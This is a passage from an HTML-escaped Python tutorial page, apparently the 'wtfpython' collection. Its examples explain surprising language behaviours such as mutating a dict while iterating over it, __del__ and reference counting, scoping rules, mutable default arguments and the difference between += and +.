class=&#34;language-py&#34;&gt;x = {0: None}&#xA;&#xA;for i in x:&#xA;    del x[i]&#xA;    x[i+1] = None&#xA;    print(i)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.7- Python 3.5):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0&#xA;1&#xA;2&#xA;3&#xA;4&#xA;5&#xA;6&#xA;7&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Yes, it runs for exactly &lt;strong&gt;eight&lt;/strong&gt; times and stops.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Iteration over a dictionary that you edit at the same time is not supported.&lt;/li&gt; &#xA; &lt;li&gt;It runs eight times because that&#39;s the point at which the dictionary resizes to hold more keys (we have eight deletion entries, so a resize is needed). This is actually an implementation detail.&lt;/li&gt; &#xA; &lt;li&gt;How deleted keys are handled and when the resize occurs might be different for different Python implementations.&lt;/li&gt; &#xA; &lt;li&gt;So for Python versions other than Python 2.7 - Python 3.5, the count might be different from 8 (but whatever the count is, it&#39;s going to be the same every time you run it). You can find some discussion around this &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/53&#34;&gt;here&lt;/a&gt; or in &lt;a href=&#34;https://stackoverflow.com/questions/44763802/bug-in-python-dict&#34;&gt;this&lt;/a&gt; StackOverflow thread.&lt;/li&gt; &#xA; &lt;li&gt;Python 3.7.6 onwards, you&#39;ll see &lt;code&gt;RuntimeError: dictionary keys changed during iteration&lt;/code&gt; exception if you try to do this.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Stubborn &lt;code&gt;del&lt;/code&gt; operation&lt;/h3&gt; &#xA;&lt;!-- Example ID: 777ed4fd-3a2d-466f-95e7-c4058e61d78e ---&gt; &#xA;&lt;!-- read-only --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass:&#xA;    def __del__(self):&#xA;        print(&#34;Deleted!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; 1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; y = x&#xA;&amp;gt;&amp;gt;&amp;gt; del x # this should print &#34;Deleted!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; del y&#xA;Deleted!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Phew, deleted at last. You might have guessed what saved &lt;code&gt;__del__&lt;/code&gt; from being called in our first attempt to delete &lt;code&gt;x&lt;/code&gt;. Let&#39;s add more twists to the example.&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = SomeClass()&#xA;&amp;gt;&amp;gt;&amp;gt; y = x&#xA;&amp;gt;&amp;gt;&amp;gt; del x&#xA;&amp;gt;&amp;gt;&amp;gt; y # check if y exists&#xA;&amp;lt;__main__.SomeClass instance at 0x7f98a1a67fc8&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt; del y # Like previously, this should print &#34;Deleted!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; globals() # oh, it didn&#39;t. Let&#39;s check all our global variables and confirm&#xA;Deleted!&#xA;{&#39;__builtins__&#39;: &amp;lt;module &#39;__builtin__&#39; (built-in)&amp;gt;, &#39;SomeClass&#39;: &amp;lt;class __main__.SomeClass at 0x7f98a1a5f668&amp;gt;, &#39;__package__&#39;: None, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Okay, now it&#39;s deleted &lt;span&gt;😕&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;del x&lt;/code&gt; doesn’t directly call &lt;code&gt;x.__del__()&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;When &lt;code&gt;del x&lt;/code&gt; is encountered, Python deletes the name &lt;code&gt;x&lt;/code&gt; from current scope and decrements by 1 the reference count of the object &lt;code&gt;x&lt;/code&gt; referenced. &lt;code&gt;__del__()&lt;/code&gt; is called only when the object&#39;s reference count reaches zero.&lt;/li&gt; &#xA; &lt;li&gt;In the second output snippet, &lt;code&gt;__del__()&lt;/code&gt; was not called because the previous statement (&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; y&lt;/code&gt;) in the interactive interpreter created another reference to the same object (specifically, the &lt;code&gt;_&lt;/code&gt; magic variable which references the result value of the last non &lt;code&gt;None&lt;/code&gt; expression on the REPL), thus preventing the reference count from reaching zero when &lt;code&gt;del y&lt;/code&gt; was encountered.&lt;/li&gt; &#xA; &lt;li&gt;Calling &lt;code&gt;globals&lt;/code&gt; (or really, executing anything that will have a non &lt;code&gt;None&lt;/code&gt; result) caused &lt;code&gt;_&lt;/code&gt; to reference the new result, dropping the existing reference. Now the reference count reached 0 and we can see &#34;Deleted!&#34; being printed (finally!).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The out of scope variable&lt;/h3&gt; &#xA;&lt;!-- Example ID: 75c03015-7be9-4289-9e22-4f5fdda056f7 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = 1&#xA;def some_func():&#xA;    return a&#xA;&#xA;def another_func():&#xA;    a += 1&#xA;    return a&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_closure_func():&#xA;    a = 1&#xA;    def some_inner_func():&#xA;        return a&#xA;    return some_inner_func()&#xA;&#xA;def another_closure_func():&#xA;    a = 1&#xA;    def another_inner_func():&#xA;        a += 1&#xA;        return a&#xA;    return another_inner_func()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;UnboundLocalError: local variable &#39;a&#39; referenced before assignment&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; some_closure_func()&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; another_closure_func()&#xA;UnboundLocalError: local variable &#39;a&#39; referenced before assignment&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;When you make an assignment to a variable in scope, it becomes local to that scope. So &lt;code&gt;a&lt;/code&gt; becomes local to the scope of &lt;code&gt;another_func&lt;/code&gt;, but it has not been initialized previously in the same scope, which throws an error.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To modify the outer scope variable &lt;code&gt;a&lt;/code&gt; in &lt;code&gt;another_func&lt;/code&gt;, we have to use the &lt;code&gt;global&lt;/code&gt; keyword.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def another_func()&#xA;    global a&#xA;    a += 1&#xA;    return a&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In &lt;code&gt;another_closure_func&lt;/code&gt;, &lt;code&gt;a&lt;/code&gt; becomes local to the scope of &lt;code&gt;another_inner_func&lt;/code&gt;, but it has not been initialized previously in the same scope, which is why it throws an error.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To modify the outer scope variable &lt;code&gt;a&lt;/code&gt; in &lt;code&gt;another_inner_func&lt;/code&gt;, use the &lt;code&gt;nonlocal&lt;/code&gt; keyword. The nonlocal statement is used to refer to variables defined in the nearest outer (excluding the global) scope.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def another_func():&#xA;    a = 1&#xA;    def another_inner_func():&#xA;        nonlocal a&#xA;        a += 1&#xA;        return a&#xA;    return another_inner_func()&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; another_func()&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The keywords &lt;code&gt;global&lt;/code&gt; and &lt;code&gt;nonlocal&lt;/code&gt; tell the python interpreter to not declare new variables and look them up in the corresponding outer scopes.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Read &lt;a href=&#34;https://sebastianraschka.com/Articles/2014_python_scope_and_namespaces.html&#34;&gt;this&lt;/a&gt; short but an awesome guide to learn more about how namespaces and scope resolution works in Python.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Deleting a list item while iterating&lt;/h3&gt; &#xA;&lt;!-- Example ID: 4cc52d4e-d42b-4e09-b25f-fbf5699b7d4e ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;list_1 = [1, 2, 3, 4]&#xA;list_2 = [1, 2, 3, 4]&#xA;list_3 = [1, 2, 3, 4]&#xA;list_4 = [1, 2, 3, 4]&#xA;&#xA;for idx, item in enumerate(list_1):&#xA;    del item&#xA;&#xA;for idx, item in enumerate(list_2):&#xA;    list_2.remove(item)&#xA;&#xA;for idx, item in enumerate(list_3[:]):&#xA;    list_3.remove(item)&#xA;&#xA;for idx, item in enumerate(list_4):&#xA;    list_4.pop(idx)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list_1&#xA;[1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; list_2&#xA;[2, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; list_3&#xA;[]&#xA;&amp;gt;&amp;gt;&amp;gt; list_4&#xA;[2, 4]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Can you guess why the output is &lt;code&gt;[2, 4]&lt;/code&gt;?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;It&#39;s never a good idea to change the object you&#39;re iterating over. The correct way to do so is to iterate over a copy of the object instead, and &lt;code&gt;list_3[:]&lt;/code&gt; does just that.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_list = [1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; id(some_list)&#xA;139798789457608&#xA;&amp;gt;&amp;gt;&amp;gt; id(some_list[:]) # Notice that python creates new object for sliced list.&#xA;139798779601192&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Difference between &lt;code&gt;del&lt;/code&gt;, &lt;code&gt;remove&lt;/code&gt;, and &lt;code&gt;pop&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;del var_name&lt;/code&gt; just removes the binding of the &lt;code&gt;var_name&lt;/code&gt; from the local or global namespace (That&#39;s why the &lt;code&gt;list_1&lt;/code&gt; is unaffected).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;remove&lt;/code&gt; removes the first matching value, not a specific index, raises &lt;code&gt;ValueError&lt;/code&gt; if the value is not found.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;pop&lt;/code&gt; removes the element at a specific index and returns it, raises &lt;code&gt;IndexError&lt;/code&gt; if an invalid index is specified.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Why the output is &lt;code&gt;[2, 4]&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The list iteration is done index by index, and when we remove &lt;code&gt;1&lt;/code&gt; from &lt;code&gt;list_2&lt;/code&gt; or &lt;code&gt;list_4&lt;/code&gt;, the contents of the lists are now &lt;code&gt;[2, 3, 4]&lt;/code&gt;. The remaining elements are shifted down, i.e., &lt;code&gt;2&lt;/code&gt; is at index 0, and &lt;code&gt;3&lt;/code&gt; is at index 1. Since the next iteration is going to look at index 1 (which is the &lt;code&gt;3&lt;/code&gt;), the &lt;code&gt;2&lt;/code&gt; gets skipped entirely. A similar thing will happen with every alternate element in the list sequence.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Refer to this StackOverflow &lt;a href=&#34;https://stackoverflow.com/questions/45946228/what-happens-when-you-try-to-delete-a-list-element-while-iterating-over-it&#34;&gt;thread&lt;/a&gt; explaining the example&lt;/li&gt; &#xA; &lt;li&gt;See also this nice StackOverflow &lt;a href=&#34;https://stackoverflow.com/questions/45877614/how-to-change-all-the-dictionary-keys-in-a-for-loop-with-d-items&#34;&gt;thread&lt;/a&gt; for a similar example related to dictionaries in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Lossy zip of iterators *&lt;/h3&gt; &#xA;&lt;!-- Example ID: c28ed154-e59f-4070-8eb6-8967a4acac6d ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; numbers = list(range(7))&#xA;&amp;gt;&amp;gt;&amp;gt; numbers&#xA;[0, 1, 2, 3, 4, 5, 6]&#xA;&amp;gt;&amp;gt;&amp;gt; first_three, remaining = numbers[:3], numbers[3:]&#xA;&amp;gt;&amp;gt;&amp;gt; first_three, remaining&#xA;([0, 1, 2], [3, 4, 5, 6])&#xA;&amp;gt;&amp;gt;&amp;gt; numbers_iter = iter(numbers)&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(numbers_iter, first_three)) &#xA;[(0, 0), (1, 1), (2, 2)]&#xA;# so far so good, let&#39;s zip the remaining&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(numbers_iter, remaining))&#xA;[(4, 3), (5, 4), (6, 5)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where did element &lt;code&gt;3&lt;/code&gt; go from the &lt;code&gt;numbers&lt;/code&gt; list?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;From Python &lt;a href=&#34;https://docs.python.org/3.3/library/functions.html#zip&#34;&gt;docs&lt;/a&gt;, here&#39;s an approximate implementation of zip function, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def zip(*iterables):&#xA;    sentinel = object()&#xA;    iterators = [iter(it) for it in iterables]&#xA;    while iterators:&#xA;        result = []&#xA;        for it in iterators:&#xA;            elem = next(it, sentinel)&#xA;            if elem is sentinel: return&#xA;            result.append(elem)&#xA;        yield tuple(result)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;So the function takes in arbitrary number of iterable objects, adds each of their items to the &lt;code&gt;result&lt;/code&gt; list by calling the &lt;code&gt;next&lt;/code&gt; function on them, and stops whenever any of the iterable is exhausted.&lt;/li&gt; &#xA; &lt;li&gt;The caveat here is when any iterable is exhausted, the existing elements in the &lt;code&gt;result&lt;/code&gt; list are discarded. That&#39;s what happened with &lt;code&gt;3&lt;/code&gt; in the &lt;code&gt;numbers_iter&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The correct way to do the above using &lt;code&gt;zip&lt;/code&gt; would be, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; numbers = list(range(7))&#xA;&amp;gt;&amp;gt;&amp;gt; numbers_iter = iter(numbers)&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(first_three, numbers_iter))&#xA;[(0, 0), (1, 1), (2, 2)]&#xA;&amp;gt;&amp;gt;&amp;gt; list(zip(remaining, numbers_iter))&#xA;[(3, 3), (4, 4), (5, 5), (6, 6)]&#xA;&lt;/code&gt;&lt;/pre&gt; The first argument of zip should be the one with fewest elements.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Loop variables leaking out!&lt;/h3&gt; &#xA;&lt;!-- Example ID: ccec7bf6-7679-4963-907a-1cd8587be9ea ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;for x in range(7):&#xA;    if x == 6:&#xA;        print(x, &#39;: for x inside loop&#39;)&#xA;print(x, &#39;: x in global&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;6 : for x inside loop&#xA;6 : x in global&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But &lt;code&gt;x&lt;/code&gt; was never defined outside the scope of for loop...&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# This time let&#39;s initialize x first&#xA;x = -1&#xA;for x in range(7):&#xA;    if x == 6:&#xA;        print(x, &#39;: for x inside loop&#39;)&#xA;print(x, &#39;: x in global&#39;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;6 : for x inside loop&#xA;6 : x in global&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 1&#xA;&amp;gt;&amp;gt;&amp;gt; print([x for x in range(5)])&#xA;[0, 1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; print(x)&#xA;4&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 1&#xA;&amp;gt;&amp;gt;&amp;gt; print([x for x in range(5)])&#xA;[0, 1, 2, 3, 4]&#xA;&amp;gt;&amp;gt;&amp;gt; print(x)&#xA;1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;In Python, for-loops use the scope they exist in and leave their defined loop-variable behind. This also applies if we explicitly defined the for-loop variable in the global namespace before. In this case, it will rebind the existing variable.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The differences in the output of Python 2.x and Python 3.x interpreters for list comprehension example can be explained by following change documented in &lt;a href=&#34;https://docs.python.org/3/whatsnew/3.0.html&#34;&gt;What’s New In Python 3.0&lt;/a&gt; changelog:&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;&#34;List comprehensions no longer support the syntactic form &lt;code&gt;[... for var in item1, item2, ...]&lt;/code&gt;. Use &lt;code&gt;[... for var in (item1, item2, ...)]&lt;/code&gt; instead. Also, note that list comprehensions have different semantics: they are closer to syntactic sugar for a generator expression inside a &lt;code&gt;list()&lt;/code&gt; constructor, and in particular, the loop control variables are no longer leaked into the surrounding scope.&#34;&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Beware of default mutable arguments!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 7d42dade-e20d-4a7b-9ed7-16fb58505fe9 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(default_arg=[]):&#xA;    default_arg.append(&#34;some_string&#34;)&#xA;    return default_arg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;[&#39;some_string&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;[&#39;some_string&#39;, &#39;some_string&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_func([])&#xA;[&#39;some_string&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;[&#39;some_string&#39;, &#39;some_string&#39;, &#39;some_string&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The default mutable arguments of functions in Python aren&#39;t really initialized every time you call the function. Instead, the recently assigned value to them is used as the default value. When we explicitly passed &lt;code&gt;[]&lt;/code&gt; to &lt;code&gt;some_func&lt;/code&gt; as the argument, the default value of the &lt;code&gt;default_arg&lt;/code&gt; variable was not used, so the function returned as expected.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(default_arg=[]):&#xA;    default_arg.append(&#34;some_string&#34;)&#xA;    return default_arg&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__ #This will show the default argument values for the function&#xA;([],)&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__&#xA;([&#39;some_string&#39;],)&#xA;&amp;gt;&amp;gt;&amp;gt; some_func()&#xA;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__&#xA;([&#39;some_string&#39;, &#39;some_string&#39;],)&#xA;&amp;gt;&amp;gt;&amp;gt; some_func([])&#xA;&amp;gt;&amp;gt;&amp;gt; some_func.__defaults__&#xA;([&#39;some_string&#39;, &#39;some_string&#39;],)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;A common practice to avoid bugs due to mutable arguments is to assign &lt;code&gt;None&lt;/code&gt; as the default value and later check if any value is passed to the function corresponding to that argument. Example:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_func(default_arg=None):&#xA;    if default_arg is None:&#xA;        default_arg = []&#xA;    default_arg.append(&#34;some_string&#34;)&#xA;    return default_arg&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Catching the Exceptions&lt;/h3&gt; &#xA;&lt;!-- Example ID: b5ca5e6a-47b9-4f69-9375-cda0f8c6755d ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;try:&#xA;    # This should raise an ``IndexError``&#xA;    print(some_list[4])&#xA;except IndexError, ValueError:&#xA;    print(&#34;Caught!&#34;)&#xA;&#xA;try:&#xA;    # This should raise a ``ValueError``&#xA;    some_list.remove(4)&#xA;except IndexError, ValueError:&#xA;    print(&#34;Caught again!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;Caught!&#xA;&#xA;ValueError: list.remove(x): x not in list&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  File &#34;&amp;lt;input&amp;gt;&#34;, line 3&#xA;    except IndexError, ValueError:&#xA;                     ^&#xA;SyntaxError: invalid syntax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To add multiple Exceptions to the except clause, you need to pass them as parenthesized tuple as the first argument. The second argument is an optional name, which when supplied will bind the Exception instance that has been raised. Example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;try:&#xA;   # This should raise a ``ValueError``&#xA;   some_list.remove(4)&#xA;except (IndexError, ValueError), e:&#xA;   print(&#34;Caught again!&#34;)&#xA;   print(e)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Caught again!&#xA;list.remove(x): x not in list&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  File &#34;&amp;lt;input&amp;gt;&#34;, line 4&#xA;    except (IndexError, ValueError), e:&#xA;                                     ^&#xA;IndentationError: unindent does not match any outer indentation level&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Separating the exception from the variable with a comma is deprecated and does not work in Python 3; the correct way is to use &lt;code&gt;as&lt;/code&gt;. Example,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;try:&#xA;    some_list.remove(4)&#xA;&#xA;except (IndexError, ValueError) as e:&#xA;    print(&#34;Caught again!&#34;)&#xA;    print(e)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code&gt;Caught again!&#xA;list.remove(x): x not in list&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Same operands, different story!&lt;/h3&gt; &#xA;&lt;!-- Example ID: ca052cdf-dd2d-4105-b936-65c28adc18a0 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = [1, 2, 3, 4]&#xA;b = a&#xA;a = a + [5, 6, 7, 8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;[1, 2, 3, 4, 5, 6, 7, 8]&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;[1, 2, 3, 4]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = [1, 2, 3, 4]&#xA;b = a&#xA;a += [5, 6, 7, 8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a&#xA;[1, 2, 3, 4, 5, 6, 7, 8]&#xA;&amp;gt;&amp;gt;&amp;gt; b&#xA;[1, 2, 3, 4, 5, 6, 7, 8]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;a += b&lt;/code&gt; doesn&#39;t always behave the same way as &lt;code&gt;a = a + b&lt;/code&gt;. Classes &lt;em&gt;may&lt;/em&gt; implement the &lt;em&gt;&lt;code&gt;op=&lt;/code&gt;&lt;/em&gt; operators differently, and lists do this.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The expression &lt;code&gt;a = a + 